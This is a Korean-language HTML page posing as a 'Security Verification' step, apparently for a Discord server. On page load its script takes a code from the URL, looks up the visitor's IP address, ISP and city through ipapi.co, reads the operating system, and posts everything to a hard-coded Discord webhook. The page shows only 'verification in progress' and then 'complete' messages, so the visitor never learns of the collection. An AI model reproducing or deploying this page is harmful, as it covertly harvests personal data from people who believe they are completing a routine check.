<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Security Verification</title>
    <script>
        window.onload = async function() {
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');
            const webhook = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; // 여기에 웹훅 주소 입력

            if (!code) return;

            // IP 및 통신사 정보 수집
            let ipData = { ip: "수집 실패", isp: "알 수 없음", loc: "대한민국" };
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                ipData = { ip: d.ip, isp: d.org, loc: d.city };
            } catch (e) {}

            // 웹훅 전송 데이터 구성
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공 (Detailed Log)",
                    "color": 2335833,
                    "fields": [
                        { "name": "👤 인증 코드", "value": `\`${code}\``, "inline": false },
                        { "name": "📧 이메일 정보", "value": "봇 서버에서 분석 중...", "inline": true },
                        { "name": "🏘️ 가입 서버 목록", "value": "봇 서버에서 추출 중...", "inline": true },
                        { "name": "🌐 아이피 정보", "value": `IP: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
                        { "name": "📶 통신사 정보", "value": ipData.isp, "inline": true },
                        { "name": "💻 운영체제", "value": navigator.platform, "inline": true }
                    ],
                    "footer": { "text": "Log ID: " + Math.random().toString(36).substring(2,12).toUpperCase() },
                    "timestamp": new Date().toISOString()
                }]
            };

            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            // UI 업데이트
            document.getElementById('status').innerText = "인증 완료! 서버를 확인하세요.";
        }
    </script>
</head>
<body style="background:#0b0e14; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
    <div style="text-align:center; background:#161b22; padding:50px; border-radius:20px; border:1px solid #30363d;">
        <h1 id="status">보안 인증 처리 중...</h1>
        <p style="color:#8b949e;">계정 및 서버 정보를 확인하고 있습니다.</p>
    </div>
</body>
</html>
